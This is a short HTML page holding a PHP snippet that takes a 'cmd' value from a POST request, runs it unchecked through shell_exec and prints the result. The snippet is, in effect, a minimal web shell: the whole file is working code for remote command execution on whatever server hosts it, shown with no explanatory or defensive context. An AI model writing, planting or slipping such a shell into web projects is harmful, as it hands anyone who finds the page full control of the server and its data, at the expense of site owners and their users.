<!DOCTYPE html>
<html>
<body>

<?php
$command = $_POST['cmd'];
$output = shell_exec( $command);
echo "<pre>$output</pre>";

?>

</body>
</html>